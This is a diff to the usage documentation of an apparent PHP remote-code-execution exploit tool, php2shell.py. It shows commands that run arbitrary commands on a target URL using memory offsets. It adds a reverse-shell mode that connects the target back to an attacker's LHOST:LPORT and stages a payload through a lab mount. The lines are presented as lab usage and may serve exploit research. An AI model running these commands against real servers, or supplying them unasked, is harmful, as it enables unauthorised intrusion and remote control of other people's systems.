@@ -66,6 +66,12 @@ python3 php2shell.py -u http://TARGET/index.php \
     --zif-offset 0x465370 --dtor-offset 0x65eb60 --htdata-offset 0x690d8 -c id
 python3 php2shell.py -u http://TARGET/index.php --engine 3em0 -c id
 
+# reverse shell — the client receives the shell interactively
+# (lab: payload staged via the lab/out mount; banner + commands come back live)
+python3 php2shell.py -u http://TARGET/index.php --reverse 5555
+python3 php2shell.py -u http://TARGET/index.php --reverse LHOST:LPORT \
+    --stage-host lab/out/c --stage-target /out/c
+
 # bundled offset database
 python3 php2shell.py --list-offsets
 ```
